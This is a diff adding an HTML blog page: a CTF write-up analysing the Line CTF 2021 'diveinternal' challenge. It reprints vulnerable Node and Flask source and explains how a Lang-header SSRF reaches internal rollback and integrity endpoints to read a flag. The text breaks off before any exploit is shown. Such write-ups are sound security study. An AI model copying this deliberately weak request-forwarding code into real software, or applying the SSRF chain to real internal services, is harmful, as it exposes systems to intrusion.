@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Line CTF 2021 diveinternal Write Up :: My New Hugo Site</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="This article is about write-up for the Line ctf 2021. there is only one web challenge, which contain an SSRF bug" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://example.org/posts/2021-03-21-line-ctf/" />
+
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="https://example.org/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://example.org/img/theme-colors/orange.png">
+  <link rel="apple-touch-icon" href="https://example.org/img/theme-colors/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Line CTF 2021 diveinternal Write Up">
+<meta property="og:description" content="This article is about write-up for the Line ctf 2021. there is only one web challenge, which contain an SSRF bug" />
+<meta property="og:url" content="https://example.org/posts/2021-03-21-line-ctf/" />
+<meta property="og:site_name" content="My New Hugo Site" />
+
+  
+    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2021-03-21 23:29:53 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+</head>
+<body class="">
+
+
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://example.org/">
+  <div class="logo">
+    re-Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://example.org/posts/2021-03-21-line-ctf/">Line CTF 2021 diveinternal Write Up</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2021-03-21</time>
+    
+</div>
+
+  
+  
+
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="https://github.com/wjddnjs33/image/blob/main/images/linectf.png?raw=true" alt=""></p>
+<p>I solved one challenge for web</p>
+<hr>
+<h1 id="web-diveinternal-50-pts">(Web) diveinternal [50 pts]<a href="#web-diveinternal-50-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<blockquote>
+<p>The diveinternal challenge is to get a flag using an ssrf vulenrability.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">request</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;request&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">querystring</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;querystring&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">NODE_ENV</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;local&#39;</span>) { <span style="color:#75715e">//set the environment value before your running this app
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;dotenv&#39;</span>).<span style="color:#a6e22e">config</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">target</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">TARGET_HOST</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">TEST</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* GET home page. */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">request</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">uri</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">target</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/`</span>,
+</span></span><span style="display:flex;"><span>  }, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">data</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>, { <span style="color:#a6e22e">title</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;apis&#39;</span> , <span style="color:#a6e22e">data</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">data</span>.<span style="color:#a6e22e">body</span>});
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/coin&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">request</span>({
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">headers</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uri</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">target</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/coin`</span>,
+</span></span><span style="display:flex;"><span>      }).<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">res</span>);
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/addsub&#39;</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">request</span>({
+</span></span><span style="display:flex;"><span>          
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">uri</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`http://</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">target</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/addsub`</span>,
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">qs</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">email</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">email</span>,
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        }).<span style="color:#a6e22e">pipe</span>(<span style="color:#a6e22e">res</span>);
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">router</span>;
+</span></span></code></pre></div><p>Above code is code of <code>api</code>, I can see that send a request using a <code>${target}</code>.</p>
+<pre tabindex="0"><code>TEST=test
+TARGET_HOST=localhost:5050
+</code></pre><p>Also, I can know that send a request to internal server because <code>TARGET_HOST</code> is localhost</p>
+<pre tabindex="0"><code>FROM node:lts-alpine as base
+
+ADD ./src /src
+WORKDIR /src
+COPY /src/package*.json /
+EXPOSE 3000
+
+FROM base as production
+ENV NODE_ENV=production
+ENV TARGET_HOST=private:5000
+RUN npm install -g nodemon &amp;&amp; npm install
+RUN npm ci
+COPY . /
+CMD [&#34;node&#34;, &#34;bin/www&#34;]
+
+FROM base as dev
+ENV NODE_ENV=development
+ENV DEBUG=frontend:*
+ENV TARGET_HOST=private:5000
+RUN npm install -g nodemon &amp;&amp; npm install
+COPY . /
+CMD [&#34;nodemon&#34;, &#34;bin/www&#34;]
+
+FROM base as local
+ENV NODE_ENV=development
+ENV DEBUG=frontend:*
+ENV TARGET_HOST=localhost:5050
+RUN npm install -g nodemon &amp;&amp; npm install
+COPY . /
+CMD [&#34;nodemon&#34;, &#34;bin/www&#34;]
+</code></pre><p>When I check a docker file, I can know to was open a 5050/5000 port. Viz, I can able use a <code>localhost:5050</code>, <code>localhost:5000</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">RunRollbackDB</span>(dbhash):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;ENV&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;LOCAL&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> dbhash <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;dbhash is None&#34;</span>
+</span></span><span style="display:flex;"><span>        dbhash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(e <span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> dbhash <span style="color:#66d9ef">if</span> e<span style="color:#f92672">.</span>isalnum())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(<span style="color:#e6db74">&#39;backup/&#39;</span><span style="color:#f92672">+</span>dbhash):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;FLAG&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                flag <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> flag
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Where is file?&#34;</span>
+</span></span></code></pre></div><p>And first, when I see an important flag reading condition, If environment of server is not <code>Local</code> and exist a file called <code>'backup/' + dbhash</code>, retrun a flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/coin&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">coin</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        response <span style="color:#f92672">=</span> app<span style="color:#f92672">.</span>response_class()
+</span></span><span style="display:flex;"><span>        language <span style="color:#f92672">=</span> LanguageNomarize(request)
+</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#34;Lang&#34;</span>] <span style="color:#f92672">=</span>  language
+</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> getCoinInfo()
+</span></span><span style="display:flex;"><span>        response<span style="color:#f92672">.</span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(data)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> response
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e :
+</span></span><span style="display:flex;"><span>        err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Error On  </span><span style="color:#e6db74">{f}</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">{c}</span><span style="color:#e6db74">, Message, </span><span style="color:#e6db74">{m}</span><span style="color:#e6db74">, Error on line </span><span style="color:#e6db74">{l}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(f <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>_getframe()<span style="color:#f92672">.</span>f_code<span style="color:#f92672">.</span>co_name ,c <span style="color:#f92672">=</span> type(e)<span style="color:#f92672">.</span>__name__, m <span style="color:#f92672">=</span> str(e), l <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>exc_info()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>tb_lineno)
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>error(err)
+</span></span></code></pre></div><p>First, I can see that when <code>api</code> server send a request to <code>/coin</code> , put a result value of <code>LanguageNomarize()</code> function to header called <code>Lang</code> and to reponse after bring an information of coin using a <code>getCoinInfo()</code> function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">LanguageNomarize</span>(request):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Lang&#39;</span>) <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;en&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        regex <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;^[!@#$</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">/.].*/.*&#39;</span> <span style="color:#75715e"># Easy~~</span>
+</span></span><span style="display:flex;"><span>        language <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Lang&#39;</span>)
+</span></span><span style="display:flex;"><span>        language <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>sub(<span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;%00|</span><span style="color:#e6db74">%0d</span><span style="color:#e6db74">|</span><span style="color:#e6db74">%0a</span><span style="color:#e6db74">|[!@#$^]|\.\./&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, language)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> re<span style="color:#f92672">.</span>search(regex,language):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Lang&#39;</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(request<span style="color:#f92672">.</span>host_url<span style="color:#f92672">+</span>language, headers<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>headers)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> data<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> data<span style="color:#f92672">.</span>text
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Lang&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Lang&#39;</span>)
+</span></span></code></pre></div><p>When I see a <code>LanguateNomarize()</code> function, If to exist a header called <code>Lang</code>, confirm a value of header using regular expression, and I can see to send a request using a <code>request.get()</code> function. In here, Occur an <code>ssrf</code> vulnerability because I can send a request of where I want after modifying a <code>request.host_url</code> and <code>language</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/integrityStatus&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">integritycheck</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;db&#39;</span>:<span style="color:#e6db74">&#39;database/master.db&#39;</span>,<span style="color:#e6db74">&#39;dbhash&#39;</span>:activity<span style="color:#f92672">.</span>dbHash}
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
+</span></span></code></pre></div><p>Second, I&rsquo;ll check the <code>/integrityStatus</code>. We usually can&rsquo;t send a request because <code>/integrityStatus</code> not communicating to <code>api</code> server. But I can find a value of <code>dbhash</code> by making a request to <code>/integrityStatus</code> using an <code>ssrf</code> vulnerability.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/rollback&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rollback</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Sign&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;sign&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> SignCheck(request):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;sign&#39;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Key&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;key&#39;</span>])
+</span></span><span style="display:flex;"><span>        result  <span style="color:#f92672">=</span> activity<span style="color:#f92672">.</span>IntegrityCheck(request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;Key&#39;</span>),request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;dbhash&#39;</span>))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e :
+</span></span><span style="display:flex;"><span>        err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Error On  </span><span style="color:#e6db74">{f}</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">{c}</span><span style="color:#e6db74">, Message, </span><span style="color:#e6db74">{m}</span><span style="color:#e6db74">, Error on line </span><span style="color:#e6db74">{l}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(f <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>_getframe()<span style="color:#f92672">.</span>f_code<span style="color:#f92672">.</span>co_name ,c <span style="color:#f92672">=</span> type(e)<span style="color:#f92672">.</span>__name__, m <span style="color:#f92672">=</span> str(e), l <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>exc_info()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>tb_lineno)
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>error(err)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;error&#39;</span>]), <span style="color:#ae81ff">404</span>
+</span></span></code></pre></div><p>Third, I can see that when I see a <code>/rollback</code>, If value of <code>SignCheck()</code> is true and exist a value of header called <code>Key</code>, call an <code>IntegrityCheck()</code> method.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">IntegrityCheck</span>(self,key, dbHash): 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>integrityKey <span style="color:#f92672">==</span> key:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> json<span style="color:#f92672">.</span>dumps(status[<span style="color:#e6db74">&#39;key&#39;</span>])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>dbHash <span style="color:#f92672">!=</span> dbHash:
+</span></span><span style="display:flex;"><span>            flag <span style="color:#f92672">=</span> RunRollbackDB(dbHash)
+</span></span><span style="display:flex;"><span>            logger<span style="color:#f92672">.</span>debug(<span style="color:#e6db74">&#39;DB File changed!!&#39;</span><span style="color:#f92672">+</span>dbHash)
+</span></span><span style="display:flex;"><span>            file <span style="color:#f92672">=</span> open(os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;DBFILE&#39;</span>],<span style="color:#e6db74">&#39;rb&#39;</span>)<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>dbHash <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>md5(file)<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>integrityKey <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512((self<span style="color:#f92672">.</span>dbHash)<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>))<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> flag
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;DB is safe!&#34;</span>
+</span></span></code></pre></div><p>When I see the <code>IntegrityCheck()</code> method, the value of <code>self.integrityKey</code> and the value of <code>Key</code> are the same, and if the value of <code>self.dbHash</code> and <code>dbHash</code> are not the same, I can see that the <code>RunRollbackDB()</code> function is executed.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">RunRollbackDB</span>(dbhash):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;ENV&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;LOCAL&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> dbhash <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;dbhash is None&#34;</span>
+</span></span><span style="display:flex;"><span>        dbhash <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(e <span style="color:#66d9ef">for</span> e <span style="color:#f92672">in</span> dbhash <span style="color:#66d9ef">if</span> e<span style="color:#f92672">.</span>isalnum())
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(<span style="color:#e6db74">&#39;backup/&#39;</span><span style="color:#f92672">+</span>dbhash):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;FLAG&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                flag <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> flag
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Where is file?&#34;</span>
+</span></span><span style="display:flex;"><span>                
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e :
+</span></span><span style="display:flex;"><span>        logger<span style="color:#f92672">.</span>error(<span style="color:#e6db74">&#39;Error On  </span><span style="color:#e6db74">{f}</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">{c}</span><span style="color:#e6db74">, Message, </span><span style="color:#e6db74">{m}</span><span style="color:#e6db74">, Error on line </span><span style="color:#e6db74">{l}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(f <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>_getframe()<span style="color:#f92672">.</span>f_code<span style="color:#f92672">.</span>co_name ,c <span style="color:#f92672">=</span> type(e)<span style="color:#f92672">.</span>__name__, m <span style="color:#f92672">=</span> str(e), l <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>exc_info()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>tb_lineno))
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;exception!!&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span></code></pre></div><p><code>RunRollbackDB()</code> is a function that reads and returns a <code>FLAG</code> file if the <code>backup/dbhash</code> file exists, as seen above.</p>
+<p>So I thought with the following scenario at first</p>
+<ul>
+<li>Scenario 1</li>
+</ul>
+<ol>
